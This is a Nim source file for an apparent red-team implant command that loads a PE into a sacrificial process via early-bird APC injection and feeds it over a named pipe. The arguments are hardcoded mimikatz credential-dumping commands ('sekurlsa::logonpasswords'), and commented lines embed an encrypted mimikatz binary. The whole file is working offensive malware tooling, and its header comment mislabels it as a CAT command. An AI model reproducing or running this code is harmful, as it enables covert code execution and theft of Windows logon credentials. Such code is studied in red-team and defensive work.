# This is the source for the CAT command
import ../rth/spawning/early_bird_apc
import ../rth/rth
import ../fileManager
import ../structs
import ../utils
import ../b64

import json
import winim
import winim/winstr
import strformat
import std/tables

var toolOutput = ""
#const mimData  = slurp("/home/msc/documents/python/red-team-server/testing/mimikatz.exe.enc")
#var mim = cast[seq[byte]](mimData)

#[
  To read the output from the sacrificial process
]#
proc readPipe(readHandle: HANDLE): string =

  var buffer = alloc(500)
  var status: BOOL
  var bytesRead: DWORD

  while true:
    status = ReadFile(
            readHandle,
            buffer,
            cast[DWORD](500),
            addr bytesRead,
            NULL
        )

    if status == FALSE or bytesRead == 0:
      continue

    echo fmt"Result: {status} BytesRead: {bytesRead}"
    toolOutput &= $(cast[cstring](buffer))
    zeroMem(buffer, 500)

#
#[
Short Command Description
  {"path": "anwiththestruct"}

]#
proc cmd_execute_pe*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let executable = params["executable"].getStr()
  #let args = params["arguments"].getStr()
  var args = "\"blah\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
  let launcher = params["launcher"].getStr()

  # Configure Output
  var
    output = ""
    status = ""

  # Do the Magic

  if sharedBuffer.hasKey(executable):

    # initialize all the variables that are needed
    var
      ps: SECURITY_ATTRIBUTES
      childRead: HANDLE
      childWrite: HANDLE
      ret: WINBOOL

    # create named pipe server
    var pipe: HANDLE = CreateNamedPipe(
      r"\\.\pipe\dafuqdafuq",
      PIPE_ACCESS_DUPLEX,
      PIPE_TYPE_BYTE,
      1,
      0,
      0,
      0,
      NULL
    )

    ps.nLength = sizeof(ps).cint
    ps.bInheritHandle = TRUE
    ps.lpSecurityDescriptor = NULL

    if not bool(pipe) or pipe == INVALID_HANDLE_VALUE:
      DBG("[-] Server pipe creation failed")
      status = "error"
      return buildReturnData(task.id, output, status)

    if CreatePipe(addr childRead, addr childWrite, addr ps, 0) == FALSE:
      DBG("[-] Failed to Create IO Pipe")
      status = "error"
      return buildReturnData(task.id, output, status)

    DBG("[+] Created IO Pipe")

    if SetHandleInformation(childRead, HANDLE_FLAG_INHERIT, 0) == FALSE:
      DBG("[-] Failed to SetHandleInformation")
      status = "error"
      return buildReturnData(task.id, output, status)

    var peFile = newSeq[byte](sharedBuffer[executable][0])
    copyMem(addr peFile[0], sharedBuffer[executable][1], sharedBuffer[executable][0])
    var sizePeFile = sharedBuffer[executable][0]
    #var sizePeFile = cast[DWORD](len(mim))
    # Execute the early-bird-injection
    var payload = Payload()
    payload.bytes = b64.decode(Base64Pad, launcher)
    discard payload.execute(childRead, childWrite)
    #payload.bytes = newSeq[byte](sharedBuffer[assembly][0])
    #payload.decrypt(0x5F)

    try:
      DBG("[*] Waiting for client(s)")
      var res: BOOL = ConnectNamedPipe(pipe, NULL)
      DBG("[+] Client connected!")


      var sizeArgs: DWORD = int32(len(args))
      var
        bytesWritten: DWORD
        bytesRead: DWORD


      DBG(fmt"[*] 1) Writing payload size to pipe [{sizePeFile}]")
      ret = WriteFile(
          pipe,
          addr sizePeFile,
          (DWORD) sizeof(DWORD),
          addr bytesWritten,
          NULL
      )

      DBG(fmt"[*] 2) Writing argument size to pipe [{sizeArgs}]")

      ret = WriteFile(
          pipe,
          addr sizeArgs,
          (DWORD) sizeof(DWORD),
          addr bytesWritten,
          NULL
      )

      DBG(fmt"[*] 3) Writing payload to pipe [{sizePeFile}]")
      ret = WriteFile(
          pipe,
          #addr peFile[0],
          addr peFile[0],
          (DWORD)sizePeFile,
          addr bytesWritten,
          NULL
      )

      DBG("[*] 4) Writing arguments to pipe")

      ret = WriteFile(
          pipe,
          args.cstring,
          (DWORD)sizeArgs,
          addr bytesWritten,
          NULL
      )

      DBG(fmt"[*] Total bytes written: {bytesWritten}")


      # create a thread to read from the sacrificial process
      var threadHndl = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](readPipe), cast[LPVOID](childRead), 0, NULL)
      WaitForSingleObject(threadHndl, 5000) # wait 5 secondos for full output to not hang
      output = toolOutput
      DBG(toolOutput)
    finally:
      CloseHandle(pipe)


  else:
    # if the executable is not yet registered
    # return an error
    status = "error"
    return buildReturnData(task.id, output, status)

  # return the response
  return buildReturnData(task.id, output, status)

